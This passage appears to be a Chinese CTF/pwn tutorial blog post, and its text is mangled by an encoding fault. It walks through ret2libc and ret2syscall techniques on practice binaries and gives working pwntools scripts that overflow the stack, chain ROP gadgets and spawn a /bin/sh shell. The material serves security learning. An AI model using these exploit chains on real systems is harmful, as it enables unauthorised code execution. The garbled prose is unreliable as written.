<p>è¦æ„é€ ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œå…ˆè°ƒç”¨systemå‡½æ•°ï¼Œç„¶åæŒ‰ç…§è°ƒç”¨æµç¨‹ï¼Œå‚æ•°ï¼ˆbin&#x2F;shå­—ç¬¦ä¸²æ‰€åœ¨çš„ä½ç½®ï¼‰å…¥æ ˆï¼Œè¿”å›åœ°å€å…¥æ ˆ</p>
<p>payloadçš„å½¢å¼æ˜¯**[åƒåœ¾å¡«å……] + [systemå‡½æ•°åœ°å€] + [systemè¿”å›åœ°å€] + [binshå­—ç¬¦ä¸²åœ°å€]**</p>
<h4 id="è„šæœ¬-2"><a href="#è„šæœ¬-2" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.arch = &quot;i386&quot; # å¼ºçƒˆå»ºè®®åŠ ä¸Šè¿™ä¸€è¡Œ</span><br><span class="line">p = process(&quot;./ret2libc1&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x08048595&quot;) # è°ƒè¯•æ—¶å¯ç”¨</span><br><span class="line"></span><br><span class="line">#elf = ELF(&quot;./ret2libc1&quot;)</span><br><span class="line">#system = elf.plt[&quot;system&quot;]</span><br><span class="line">binsh = 0x0804A028 # ç¡®ä¿è¿™ä¸ªåœ°å€ç¡®å®åŒ…å« &quot;/bin/sh&quot; å­—ç¬¦ä¸²</span><br><span class="line">p.recvuntil(b&quot;ret2libc1\n&quot;) </span><br><span class="line">payload = b&#x27;a&#x27; * (0x108 + 4)+ p32(0x080483D0)+p32(0)+p32(0x804A028)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°systemå‡½æ•°ä½ç½®</p>
<p><code>elf = ELF(&quot;./ret2libc1&quot;)</code>        <code>system = elf.plt[&quot;system&quot;]</code>ç›´æ¥æ‰¾åˆ°systemdçš„å…¥å£</p>
<p><strong>æ³¨æ„</strong></p>
<p>[systemè¿”å›åœ°å€] ä¸èƒ½ä¹±å†™ï¼Œåé—¨å‡½æ•°æ‰§è¡Œç»“æŸåä¼šè¿”å›è¿™ä¸ªåœ°å€ï¼Œé”™è¯¯çš„åœ°å€ä¼šå¼•å‘å´©æºƒ</p>
<p>1.<strong><code>elf.plt[&quot;exit&quot;]</code> (æœ€å¸¸ç”¨ï¼Œæ¨è)</strong>ï¼š</p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šè®© <code>system(&quot;/bin/sh&quot;)</code> æ‰§è¡Œå®Œæ¯•åï¼Œç¨‹åºèƒ½å¤Ÿå¹²å‡€åœ°è°ƒç”¨ <code>exit()</code> å‡½æ•°å¹¶é€€å‡ºã€‚è¿™æ˜¯æœ€æ¨èçš„åšæ³•ï¼Œå› ä¸ºå®ƒç¡®ä¿äº†ç¨‹åºçš„æ­£å¸¸ç»ˆæ­¢ã€‚</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šç¨³å®šã€å¯é ï¼Œä¸ä¼šå¯¼è‡´å´©æºƒã€‚</li>
<li><strong>è·å–æ–¹å¼</strong>ï¼š<code>elf.plt[&quot;exit&quot;]</code> (<code>pwntools</code> ä¼šè‡ªåŠ¨è§£æ)ã€‚</li>
</ul>
<p>2.<strong><code>0x0</code> æˆ–å…¶ä»–æ— æ•ˆåœ°å€ (å¯¼è‡´å´©æºƒ)</strong>ï¼š</p>
<ul>
<li><strong>ä½œç”¨</strong>ï¼šå¦‚æœä½ åªå…³å¿ƒ <code>system(&quot;/bin/sh&quot;)</code> æ˜¯å¦è¢«æ‰§è¡Œï¼Œè€Œä¸å…³å¿ƒç¨‹åºæ˜¯å¦å´©æºƒï¼Œé‚£ä¹ˆå¯ä»¥éšä¾¿å¡«ã€‚</li>
<li><strong>ä¼˜ç‚¹</strong>ï¼šæœ€ç®€å•ã€‚</li>
<li><strong>ç¼ºç‚¹</strong>ï¼šç¨‹åºä¼šå´©æºƒï¼Œè¿™åœ¨å®é™…æ”»é˜²ä¸­é€šå¸¸æ˜¯ä¸å¸Œæœ›çœ‹åˆ°çš„ã€‚æœ‰æ—¶è°ƒè¯•æ—¶ä¸ºäº†å¿«é€ŸéªŒè¯ <code>system</code> æ˜¯å¦è¢«è°ƒç”¨ï¼Œå¯èƒ½ä¼šæš‚æ—¶ä½¿ç”¨ã€‚</li>
</ul>
<h3 id="ret2libc2-ä¸¤ä¸ªå‡½æ•°çš„ropé“¾"><a href="#ret2libc2-ä¸¤ä¸ªå‡½æ•°çš„ropé“¾" class="headerlink" title="ret2libc2(ä¸¤ä¸ªå‡½æ•°çš„ropé“¾)"></a>ret2libc2(ä¸¤ä¸ªå‡½æ•°çš„ropé“¾)</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713170240614.png"  alt="image-20250713170240614"></p>
<p>è¯¥é¢˜æ²¡æœ‰bin&#x2F;shå­—ç¬¦ä¸²</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171815449.png"  alt="image-20250711171815449"></p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦è‡ªå·±å»é€šè¿‡getæ„é€ </p>
<p>(1)funcå‡½æ•°é€šè¿‡æ ˆæº¢å‡ºä¿®æ”¹è¿”å›åœ°å€ä¸ºgets_addr,ä¼ å…¥get()çš„å‚æ•°ï¼Œbä½œä¸ºgetå‡½æ•°åº•è‰²å‚æ•°ï¼Œå³å…¶ä»ç»ˆç«¯è¯»å–çš„æ•°æ®è¦å­˜å…¥çš„åœ°æ–¹</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171840435.png"  alt="image-20250711171840435">ï¼ˆ)</p>
<p>ï¼ˆ2ï¼‰getå‡½æ•°è¢«è°ƒç”¨åä¼šä¸ºè‡ªå·±å¼€è¾Ÿç©ºé—´ï¼Œæ‰§è¡Œæ—¶å†æ¬¡é€šè¿‡æ ˆæº¢å‡ºå¡«å…¥systemå‡½æ•°çš„åœ°å€å’Œå‚æ•°ï¼Œæœ€åè°ƒç”¨systemæ‰§è¡Œæ„é€ å¥½çš„åé—¨å‡½æ•°</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171859788.png"  alt="image-20250711171859788"></p>
<p>åˆ†æä¹‹åå¾—åˆ°åº”è¯¥æ„é€ å¦‚ä¸‹å½¢å¼çš„payload</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171926928.png"  alt="image-20250711171926928"></p>
<p>å…¶ä¸­get()å‡½æ•°å’Œsyså‡½æ•°çš„å‚æ•°éƒ½æ˜¯bssæ®µï¼Œget()ç”¨æ¥æŠŠbin&#x2F;shå†™å…¥bssæ®µï¼Œsyså’Œå®ƒæ„æˆåé—¨å‡½æ•°</p>
<p>getå†™å…¥bssæ®µçš„å†…å®¹éœ€è¦ä»ç»ˆç«¯è¯»å–ï¼Œæ‰€ä»¥ä¹‹åè¿˜è¦ä¸ºå…¶å‘é€ä¸€ä¸ªâ€œbin&#x2F;shâ€</p>
<p>Payloadçš„å½¢å¼æ˜¯<strong>p32ï¼ˆgets_addrï¼‰+p32ï¼ˆsystem_addrï¼‰+p32ï¼ˆgets_p1ï¼‰+p32ï¼ˆsystem_p1ï¼‰</strong>ã€‚</p>
<p>å¼€å¯äº†NXä¿æŠ¤ï¼Œå†™å’Œè¿è¡Œä¸èƒ½åŒæ—¶å®ç°ï¼Œæ‰€ä»¥æ”¹å˜è¯¥å‡½æ•°çš„å‚æ•°ä½ç½®ï¼Œæ‰€ä»¥æŠŠ <code>/bin/sh</code>ï¼‰å†™å…¥ä¸€ä¸ªå¯å†™çš„å†…å­˜åŒºåŸŸã€‚<code>.bss</code> æ®µæ˜¯ä¸€ä¸ªéå¸¸ç†æƒ³çš„é€‰æ‹©ï¼Œå› ä¸ºå®ƒï¼š</p>
<ul>
<li><p>å¯å†™ </p>
</li>
<li><p>é€šå¸¸ä½äºå›ºå®šçš„åœ°å€ï¼ˆç‰¹åˆ«æ˜¯åœ¨ <strong>æ²¡æœ‰å¼€å¯ ASLR</strong> çš„æƒ…å†µä¸‹ï¼‰ï¼›</p>
</li>
<li><p>åœ¨ç¨‹åºè¿è¡ŒæœŸé—´æœªåˆå§‹åŒ–çš„æ•°æ®éƒ½å­˜å‚¨åœ¨è¿™é‡Œã€‚</p>
<p><strong>æ‰¾bssåœ°å€</strong></p>
<p>1.readelf</p>
<p><code>readelf -S ret2libc2</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711171951259.png"  alt="image-20250711171951259"></p>
<p>2.gdbè°ƒè¯•</p>
<p><code>gdb ./ret2libc2</code>    <code>info files</code></p>
<p><img   src="D:/Typora/image/a1f45cd6572f00a22b10553057e87fe.png"  alt="img"></p>
<p>æ˜¾ç¤ºäº†bssæ®µçš„å§‹æœ«ä½ç½®</p>
<p>3.è„šæœ¬ä¸­ç›´æ¥å¾—åˆ°</p>
<p><code>elf.bss()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172012341.png"  alt="image-20250711172012341"></p>
<h4 id="è„šæœ¬-3"><a href="#è„šæœ¬-3" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc2&quot;)</span><br><span class="line">gdb.attach(p,&quot;b *0x08048595&quot;)</span><br><span class="line">elf=ELF(&quot;./ret2libc2&quot;)</span><br><span class="line">sys=elf.plt[&quot;system&quot;]</span><br><span class="line">get=elf.plt[&quot;gets&quot;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(get)+p32(sys)+p32(bss)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li>
</ul>
<p>gdbè°ƒè¯•æ£€æŸ¥æ˜¯å¦æˆåŠŸå†™å…¥</p>
<p>cä¸€ä¸‹è¿è¡Œåˆ°ä¸‹æ–­ç‚¹ä½ç½®</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172028504.png"  alt="image-20250711172028504"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172042265.png"  alt="image-20250711172042265"></p>
<p>è¿™ä¸ªæ—¶å€™ç¬¬ä¸€ä¸ªgetå·²ç»å®ç°ï¼Œpayloadå·²ç»ä¼ å…¥äº†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172056178.png"  alt="image-20250711172056178"></p>
<p>ä¸‹ä¸€æ­¥ä¼šè¿›å…¥æˆ‘ä»¬ä¼ è¿›å»çš„getä¸­</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172132836.png"  alt="image-20250711172132836"></p>
<p>get å’Œsystemå‡½æ•°éƒ½æ‰§è¡Œç»“æŸå</p>
<p><code>x/s 0x0804a040</code>å‘ç°bsså†…å­˜å…¥äº†bin&#x2F;sh</p>
<h3 id="ret2libc2-å¤šä¸ªå‡½æ•°çš„ropé“¾"><a href="#ret2libc2-å¤šä¸ªå‡½æ•°çš„ropé“¾" class="headerlink" title="ret2libc2(å¤šä¸ªå‡½æ•°çš„ropé“¾)"></a>ret2libc2(å¤šä¸ªå‡½æ•°çš„ropé“¾)</h3><p>å‡è®¾ä¸€ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶é‡Œä»…æœ‰readå‡½æ•°ï¼Œreadå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼ˆfdï¼Œaddrå’Œlengthï¼‰</p>
<p>è¿™æ˜¯æŒ‰ç…§ä¸¤ä¸ªropé“¾å†™å‡ºçš„payloadå¡«è¡¥å½¢å¼</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172207173.png"  alt="image-20250711172207173"></p>
<p>å‡½æ•°readå› ä¸ºæ‹¥æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œæ‰€ä»¥ç›¸åº”åœ°åœ¨æ ˆä¸Šéœ€è¦æœ‰ä¸‰ä¸ªå—çš„ç©ºé—´ã€‚è¿™æ—¶ï¼Œsystemå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°çš„ä½ç½®å°±ä¼šå’Œreadå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°çš„ä½ç½®å†²çªï¼Œå¯¼è‡´æ— æ³•å°†systemå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¾ç½®åœ¨æ ˆä¸Šã€‚ä¸æ–¹ä¾¿ç›´æ¥è¦†ç›–ï¼Œå› ä¸ºreadçš„å‚æ•°é™åˆ¶æ¯”è¾ƒå¤š</p>
<p>æ‰€ä»¥è¿™ç§æƒ…å†µå°±å¯ä»¥ç”¨pop&#x2F;retè¿›è¡Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172223075.png"  alt="image-20250711172223075"></p>
<p>æ³¨æ„é€‰å–çš„åŸºæœ¬åŸåˆ™ï¼šæœ‰å‡ ä¸ªå‚æ•°å°±ç”¨å‡ ä¸ªpopæŒ‡ä»¤ï¼Œæ¯”å¦‚è°ƒç”¨å®Œgetså‡½æ•°ä¹‹åï¼Œå› ä¸ºgetså‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°ï¼Œæ‰€æœ‰å¯ä»¥å°†getså‡½æ•°çš„è¿”å›åœ°å€æ”¹ä¸º0x0804862Fï¼Œå³åªæ‰§è¡Œä¸€ä¸ªpopæŒ‡ä»¤å¼¹å‡ºå‚æ•°ä¹‹åå°±æ˜¯retæŒ‡ä»¤ï¼›æ¯”å¦‚readå‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå°±æ‰¾0x0804862Dè¿™ä¸ªä½ç½®ï¼Œå› ä¸ºè¿™ä¸ªä½ç½®çš„æŒ‡ä»¤æ˜¯3ä¸ªpopæŒ‡ä»¤åŠ ä¸Šä¸€ä¸ªretæŒ‡ä»¤</p>
<p>å¦‚ä½•<strong>å¯»æ‰¾è‹¥å¹²ä¸ªpopæŒ‡ä»¤è·Ÿç€retæŒ‡ä»¤</strong></p>
<p><code>ROPgadget --binary ret2libc2 --only &quot;pop|ret&quot;</code></p>
<p>(ROPgadgetç”¨äºæŸ¥æ‰¾ç”¨æ¥æ”»å‡»çš„å¯æ‰§è¡Œä»£ç ç‰‡æ®µï¼Œè€Œreadlfæ˜¯ç¨‹åºçš„æ•´ä½“ç»“æ„å’Œå†…å­˜å¸ƒå±€)</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172236929.png"  alt="image-20250711172236929"></p>
<h4 id="è„šæœ¬-4"><a href="#è„šæœ¬-4" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2libc2&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x8048595&quot;)</span><br><span class="line">elf=ELF(&quot;./ret2libc2&quot;)</span><br><span class="line">sys=elf.plt[&quot;system&quot;]</span><br><span class="line">get=elf.plt[&quot;gets&quot;]</span><br><span class="line">bss=elf.bss()</span><br><span class="line">pop1_ret=0x804861b</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(get)+p32(pop1_ret)+p32(bss)</span><br><span class="line">payload+=p32(sys)+p32(pop1_ret)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><code>payload += p32(get) + p32(pop1_ret) + p32(bss)</code>:</p>
<p><strong>ç›˜å­æ¯”å–»</strong></p>
<ol>
<li><p><strong>å‡†å¤‡ ROP é“¾ï¼ˆå †å ç›˜å­ï¼‰ï¼š</strong> ä½ åœ¨å†…å­˜çš„æ ˆä¸Šï¼Œä»ä¸‹å¾€ä¸Šï¼ˆä¹Ÿå°±æ˜¯ä»ä½åœ°å€å¾€é«˜åœ°å€ï¼Œå› ä¸ºæ ˆæ˜¯å‘ä¸‹å¢é•¿çš„ï¼‰ï¼Œåƒå †å ç›˜å­ä¸€æ ·æ”¾äº†ä¸€ç³»åˆ—åœ°å€ã€‚ å‡è®¾ä½ çš„ ROP é“¾ç‰‡æ®µæ˜¯ï¼š<code>A</code> (getåœ°å€), <code>B</code> (pop ebp; retåœ°å€), <code>C</code> (bssåœ°å€)ã€‚</p>
<p><strong>æ ˆä¸Šçš„ç›˜å­ï¼š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">... (å…¶ä»–æ•°æ®)</span><br><span class="line">[ C ç›˜å­ (bssåœ°å€) ]  &lt;-- ä½äºæ ˆä¸Šè¾ƒé«˜ä½ç½®</span><br><span class="line">[ B ç›˜å­ (pop ebp; retåœ°å€) ]</span><br><span class="line">[ A ç›˜å­ (getåœ°å€) ]  &lt;-- ä½äºæ ˆä¸Šè¾ƒä½ä½ç½®ï¼Œæœ€å…ˆè¢«ç¨‹åºâ€œçœ‹åˆ°â€</span><br></pre></td></tr></table></figure>

<p>å½“ç¨‹åºè¿”å›æ—¶ï¼Œä¼šå…ˆâ€œæ‹¿èµ·â€æœ€ä¸Šé¢çš„ç›˜å­ï¼ˆAï¼‰ã€‚</p>
</li>
<li><p><strong>æ‰§è¡Œ <code>get</code> å‡½æ•°ï¼ˆä½¿ç”¨ A ç›˜å­ï¼‰ï¼š</strong></p>
<ul>
<li>ç¨‹åºå› ä¸ºæ ˆæº¢å‡ºè¢«åŠ«æŒï¼Œå®ƒä¼šè·³åˆ° <code>get</code> å‡½æ•°çš„åœ°å€ï¼ˆA ç›˜ï¼‰ã€‚</li>
<li><code>get</code> å‡½æ•°å¼€å§‹æ‰§è¡Œã€‚å®ƒéœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªå†…å­˜åœ°å€æ¥å­˜æ”¾å®ƒè¯»å–çš„æ•°æ®ã€‚</li>
<li><code>get</code> å‡½æ•°ä¼šå»â€œçœ‹â€å®ƒè‡ªå·±è¿”å›åœ°å€ä¸Šæ–¹çš„â€œç›˜å­â€ï¼Œä¹Ÿå°±æ˜¯ <code>C ç›˜å­ (bssåœ°å€)</code>ã€‚</li>
<li><strong>æ‰€ä»¥ï¼Œ<code>C ç›˜å­ (bssåœ°å€)</code> è¢« <code>get</code> å‡½æ•°å½“ä½œäº†å®ƒçš„å‚æ•°</strong>ï¼Œ<code>get</code> ä¼šå°†ä½ é€šè¿‡ <code>p.sendline(&quot;/bin/sh&quot;)</code> å‘é€çš„æ•°æ®å†™å…¥åˆ° <code>C ç›˜å­</code> æ‰€æŒ‡ç¤ºçš„å†…å­˜åŒºåŸŸï¼ˆå³ <code>bss</code> æ®µï¼‰ã€‚</li>
<li><code>get</code> å‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œå®ƒéœ€è¦â€œè¿”å›â€ã€‚å®ƒä¼šä»æ ˆä¸Šå–å›å®ƒçš„è¿”å›åœ°å€ï¼Œä¹Ÿå°±æ˜¯ç´§é‚»å…¶ä¸‹çš„ <code>B ç›˜å­ (pop ebp; retåœ°å€)</code>ã€‚</li>
</ul>
</li>
<li><p><strong>æ‰§è¡Œ <code>pop ebp; ret</code> gadgetï¼ˆä½¿ç”¨ B ç›˜å­ï¼‰ï¼š</strong></p>
<ul>
<li>ç¨‹åºè·³è½¬åˆ° <code>B ç›˜å­ (pop ebp; retåœ°å€)</code>ã€‚</li>
<li>ç°åœ¨ï¼Œ<code>B ç›˜å­</code> å†…éƒ¨çš„æŒ‡ä»¤å¼€å§‹æ‰§è¡Œï¼š<ul>
<li><strong><code>pop ebp</code>ï¼š</strong> è¿™æ¡æŒ‡ä»¤ä¼šâ€œæ‹¿èµ·â€æ ˆé¡¶çš„é‚£ä¸ªç›˜å­ã€‚æ­¤æ—¶æ ˆé¡¶å°±æ˜¯ <code>C ç›˜å­ (bssåœ°å€)</code>ã€‚æ‰€ä»¥ï¼Œ<code>C ç›˜å­ (bssåœ°å€)</code> ä¼šè¢«å¼¹å‡ºå¹¶æ”¾å…¥ <code>ebp</code> å¯„å­˜å™¨ã€‚è¿™ä¸ªæ“ä½œç›¸å½“äºæŠŠ <code>C ç›˜å­</code> ä»æ ˆä¸­æ‹¿èµ°äº†ã€‚</li>
<li><strong><code>ret</code>ï¼š</strong> è¿™æ¡æŒ‡ä»¤ä¼šâ€œæ‹¿èµ·â€æ ˆä¸­ç°åœ¨æœ€ä¸Šé¢çš„ç›˜å­ï¼ˆä¹Ÿå°±æ˜¯ <code>C ç›˜å­</code> è¢«æ‹¿èµ°åæš´éœ²å‡ºçš„ä¸‹ä¸€ä¸ªç›˜å­ï¼‰ï¼Œå¹¶è·³è½¬åˆ°é‚£ä¸ªç›˜å­ä¸Šçš„åœ°å€ã€‚è¿™ä¸ªç›˜å­å°±æ˜¯ä½  ROP é“¾ä¸­çš„ä¸‹ä¸€ä¸ªå‡½æ•°åœ°å€ï¼ˆä¾‹å¦‚ <code>sys</code> å‡½æ•°çš„åœ°å€ï¼‰ã€‚</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="ret2syscall-åº•å±‚ç³»ç»Ÿè°ƒç”¨é™æ€"><a href="#ret2syscall-åº•å±‚ç³»ç»Ÿè°ƒç”¨é™æ€" class="headerlink" title="ret2syscall(åº•å±‚ç³»ç»Ÿè°ƒç”¨é™æ€)"></a>ret2syscall(åº•å±‚ç³»ç»Ÿè°ƒç”¨é™æ€)</h3><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172249291.png"  alt="image-20250711172249291"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250713164900591.png"  alt="image-20250713164900591"></p>
<p>å¼€å¯äº†NXä¿æŠ¤ï¼Œä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ ROPé“¾å®ç°è·³è½¬ï¼Œè€Œä¸æ”¹å˜æ•°æ®æ®µçš„æ•°å€¼</p>
<p>é™¤æ­¤ä¹‹å¤–æ²¡æœ‰ä¸Šé¢æœ‰æ•ˆçš„ä¸œè¥¿äº†,æ•´ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­éƒ½æ²¡æœ‰systemå‡½æ•°</p>
<p>æ‰€ä»¥è‡ªå·±ä¸ºå¯„å­˜å™¨èµ‹å€¼ä»¥æ„é€ åé—¨å‡½æ•°ã€‚ä¸”è°ƒç”¨çš„int 0x80è¦æ”¾åœ¨æœ€ä¸Šé¢ï¼Œè°ƒç”¨æ—¶ï¼Œä»ä¸‹å¾€ä¸Šå¼€å§‹æ‰§è¡Œï¼Œæ‰§è¡Œåˆ°è°ƒç”¨æŒ‡ä»¤æ—¶ï¼Œè¯¥å‡½æ•°çš„å‚æ•°å¿…é¡»å‡†å¤‡å¥½ã€</p>
<p>æ ¹æ®å‘½ä»¤æ‰¾åˆ°&#x2F;bin&#x2F;shå­—ç¬¦æ®µ å’Œint 0x80çš„è°ƒç”¨å‘½ä»¤ä»¥åŠéœ€è¦çš„pop|retå‘½ä»¤</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250711172303242.png"  alt="image-20250711172303242"></p>
<h4 id="è„šæœ¬-5"><a href="#è„šæœ¬-5" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&quot;./ret2syscall&quot;)</span><br><span class="line">#gdb.attach(p,&quot;b *0x080488ED&quot;)</span><br><span class="line">binsh=0x080ea068</span><br><span class="line">int_0x80=0x0806ce55</span><br><span class="line">pop_eax_ret = 0x080b8526</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806f200</span><br><span class="line"></span><br><span class="line">eax = 11 # #define __NR_ execve 11</span><br><span class="line">ebx = binsh</span><br><span class="line">ecx = 0</span><br><span class="line">edx = 0</span><br><span class="line">payload=b&#x27;a&#x27;*(0x108+4)</span><br><span class="line">payload+=p32(pop_eax_ret)+p32(eax)</span><br><span class="line">payload+=p32(pop_edx_ecx_ebx_ret)+p32(edx)+p32(ecx)+p32(ebx)</span><br><span class="line">payload+=p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="ç¼–è¯‘çŸ¥è¯†"><a href="#ç¼–è¯‘çŸ¥è¯†" class="headerlink" title="ç¼–è¯‘çŸ¥è¯†"></a>ç¼–è¯‘çŸ¥è¯†</h4><p>ï¼ˆ1ï¼‰é™æ€ç¼–è¯‘ã€‚ç¼–è¯‘å™¨åœ¨ç¼–è¯‘å¯æ‰§è¡Œæ–‡ä»¶çš„æ—¶å€™ï¼Œä¼šæå–å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦è°ƒç”¨çš„å¯¹åº”çš„åŠ¨æ€é“¾æ¥åº“ï¼ˆ.soï¼‰ä¸­çš„éƒ¨åˆ†ï¼Œå¹¶é“¾æ¥åˆ°å¯æ‰§è¡Œæ–‡ä»¶ä¸­</p>
<p>å»ï¼Œä½¿å¯æ‰§è¡Œæ–‡ä»¶åœ¨è¿è¡Œçš„æ—¶å€™ä¸ä¾èµ–äºåŠ¨æ€é“¾æ¥åº“ã€‚</p>
<p>ï¼ˆ2ï¼‰åŠ¨æ€ç¼–è¯‘ã€‚åŠ¨æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶éœ€è¦é™„å¸¦ä¸€ä¸ªåŠ¨æ€é“¾æ¥åº“ï¼Œåœ¨æ‰§è¡Œæ—¶ï¼Œéœ€è¦è°ƒç”¨å…¶å¯¹åº”åŠ¨æ€é“¾æ¥åº“ä¸­çš„å‘½ä»¤ã€‚æ‰€ä»¥ï¼Œå…¶ä¼˜ç‚¹ä¸€æ–¹é¢æ˜¯</p>
<p>ç¼©å°äº†å¯æ‰§è¡Œæ–‡ä»¶çš„å¤§å°ï¼Œ<strong>ä¼˜ç‚¹</strong>åŠ å¿«äº†ç¼–è¯‘é€Ÿåº¦ï¼ŒèŠ‚çœäº†ç³»ç»Ÿèµ„æºã€‚<strong>ç¼ºç‚¹</strong>ä¸€æ–¹é¢æ˜¯å“ªæ€•å¾ˆç®€å•çš„ç¨‹åºï¼Œåªè¦ç”¨åˆ°äº†é“¾æ¥åº“ä¸­çš„ä¸€ä¸¤æ¡å‘½ä»¤ï¼Œä¹Ÿè¦é™„å¸¦ä¸€ä¸ªåºå¤§çš„é“¾æ¥åº“ï¼›å¦ä¸€æ–¹é¢æ˜¯å¦‚æœå…¶ä»–è®¡ç®—æœºä¸Šæ²¡æœ‰å®‰è£…å¯¹åº”çš„è¿è¡Œåº“ï¼Œåˆ™ç»è¿‡åŠ¨æ€ç¼–è¯‘çš„å¯æ‰§è¡Œæ–‡ä»¶å°±ä¸èƒ½è¿è¡Œã€‚</p>
<p>é™æ€ç¼–è¯‘çš„ä¼˜ç¼ºç‚¹ä¸åŠ¨æ€ç¼–è¯‘æ­£å¥½ç›¸åã€‚</p>
